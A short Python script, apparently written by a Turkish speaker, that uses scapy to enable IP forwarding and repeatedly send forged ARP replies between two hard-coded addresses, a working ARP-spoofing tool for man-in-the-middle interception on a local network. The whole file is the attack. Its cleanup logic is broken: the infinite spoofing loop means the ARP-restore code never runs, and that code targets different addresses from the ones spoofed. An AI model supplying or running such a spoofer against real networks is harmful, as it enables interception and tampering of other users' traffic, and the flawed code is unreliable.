import os
import scapy.all as scapy
import time
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
def MacBulucu(ip):
    res_packet = scapy.ARP(pdst=ip)
    view_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    fake_packet = view_packet / res_packet
    packet = scapy.srp(fake_packet, timeout=2, verbose=False)[0]

    if len(packet) == 0:
        print("MAC bulunamadı")
    else:
        return (packet[0][1].hwsrc)

def ArpPaket(ip1,ip2):
    macadresi = MacBulucu(ip1)
    arp_paketi = scapy.ARP(op=2, pdst=ip1,hwdst=macadresi, psrc=ip2)
    scapy.send(arp_paketi, verbose=False)

#Çıkış yapılırken mac adresini eski haline getiren kod.
def Reset(tip1,tip2):
    macadresi = MacBulucu(tip1)
    modemmac = MacBulucu(tip2)
    arp_paketi = scapy.ARP(op=2, pdst=tip1,hwdst=macadresi, psrc=tip2,hwsrc=modemmac)
    scapy.send(arp_paketi, verbose=False,count=5)

sayac = 0
while True:
    ArpPaket("192.168.1.100","10.0.2.15")
    ArpPaket("10.0.2.15","192.168.1.100")
    sayac += 2
    print("Gönderilen Paket: "  + str(sayac), end="\r")
    time.sleep(1)

try:
    while True:
        pass

except KeyboardInterrupt:
    print("Program Bulunamadi")
    Reset("10.0.2.11", "10.0.2.1")

